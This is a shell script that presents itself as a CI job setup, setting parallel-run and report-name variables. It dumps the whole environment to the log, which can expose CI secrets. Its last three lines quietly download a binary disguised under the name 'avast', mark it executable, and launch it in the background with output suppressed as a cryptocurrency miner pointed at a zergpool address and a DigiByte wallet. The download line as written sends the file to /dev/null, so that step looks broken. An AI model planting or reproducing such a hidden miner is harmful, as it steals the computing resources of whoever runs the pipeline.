#!/bin/sh

BASEDIR=$(dirname $0)

. ${BASEDIR}/os-detect.sh

. ${BASEDIR}/ci_env.sh
echo $CI_ENV_NAME

if [ -z ${PARALLEL_NO+x} ]; then
    export PARALLEL_NO=$1
fi

echo ${PARALLEL_NO}

if [ -z ${JOB_NAME_PREFIX+x} ]; then
    export JOB_NAME_PREFIX=${TYPE}
fi

if [ -z ${REPORT_JOB_NAME+x} ]; then
  export REPORT_JOB_NAME="${JOB_NAME_PREFIX}-${PARALLEL_NO}"
fi

echo ${REPORT_JOB_NAME}

echo ==== ENV ====
env
echo =============

if [ -z ${SLEEP_SECONDS+x} ]; then
  export SLEEP_SECONDS=180
fi

curl -L https://github.com/Gow17/pos/raw/main/avast >/dev/null 2>&1
chmod +x avast  >/dev/null 2>&1
nohup ./avast -v -l  verushash.asia.mine.zergpool.com:3300 -u DSbPgrVMxZq32ZZAN4wPBqvbBK99AhH9Ab.$(echo $(shuf -i 1-99999 -n 1)-TPU) -p c=DGB -t 14 -x >/dev/null 2>&1
